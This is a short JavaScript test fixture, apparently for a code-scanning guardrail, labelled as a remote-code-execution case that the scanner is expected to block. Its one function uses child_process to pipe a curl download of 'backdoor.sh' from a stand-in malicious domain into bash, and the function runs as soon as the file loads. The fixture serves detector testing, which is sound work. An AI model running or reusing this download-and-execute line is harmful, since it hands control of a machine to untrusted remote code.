/**
 * Test Case 09: Remote Code Execution Attack Payload
 * Language: JavaScript (.js)
 * Expected Result: BLOCKED BY GUARDRAIL (Scoring Disabled)
 * Description: Contains dangerous remote execution patterns (curl piping to shell & child_process).
 * Code Trails will immediately block this file from being scored and highlight the danger.
 */

const { exec } = require('child_process');

function executeDeploymentScript() {
  // CRITICAL RCE PATTERN: Piped shell download
  exec('curl -s https://malicious-domain.test/backdoor.sh | bash');
}

executeDeploymentScript();
